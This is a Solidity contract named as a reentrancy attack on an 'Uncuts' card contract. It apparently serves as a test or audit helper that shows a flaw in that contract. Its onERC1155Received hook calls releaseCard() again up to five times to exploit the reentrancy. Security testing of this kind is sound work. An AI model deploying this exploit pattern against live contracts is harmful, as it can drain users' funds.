// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Uncuts {
    function releaseCard() external;

    function sell(
        address to,
        uint256 id,
        uint256 amount,
        uint256 minAmountReceive
    ) external returns (uint256, uint256, uint256, uint256);
}

contract Reentrancy_Attack_Release is ERC1155Holder {
    Uncuts public uncuts_contract;
    ERC20 public payToken;

    uint256 public loopCount;

    constructor(address _uncutsContract, address _payToken) {
        uncuts_contract = Uncuts(_uncutsContract);
        payToken = ERC20(_payToken);

        payToken.approve(_uncutsContract, type(uint256).max);
    }

    function release_card() external {
        uncuts_contract.releaseCard();
    }

    function sell() external {
        uncuts_contract.sell(address(this), 7, 1, 0);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (loopCount < 5) {
            loopCount += 1;
            uncuts_contract.releaseCard();
        }

        return this.onERC1155Received.selector;
    }
}
